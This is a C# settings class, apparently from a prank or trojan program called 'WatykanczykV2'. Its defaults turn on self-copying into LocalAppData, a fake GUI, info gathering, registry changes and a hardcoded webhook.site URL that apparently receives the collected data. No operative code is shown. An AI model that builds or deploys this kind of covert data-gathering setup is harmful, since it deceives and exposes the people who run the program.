using System;

namespace WatykanczykV2
{
    internal class Settings
    {
        public bool RunInTestMode;

        //Target directory settings
        public string TargetLocation;
        public bool CloneToAndRunInTargetLocation;

        //General
        public int Images;
        public string ActivationTime;
        public string WebhookURL;
        public bool UseFakeGui;
        public bool GetInfo;
        public bool SetRegistryKeys;
        public bool PlayMusic;

        public Settings()
        {
            SetDefaults();
        }

        private void SetDefaults()
        {
            RunInTestMode = !false;
            TargetLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\";
            CloneToAndRunInTargetLocation = true;
            Images = 38;
            ActivationTime = "21:37";
            WebhookURL = "https://webhook.site/662ecb06-52b6-4734-a0b4-f5e5972ea833";
            UseFakeGui = true;
            GetInfo = true;
            SetRegistryKeys = true;
            PlayMusic = true;
        }
    }
}
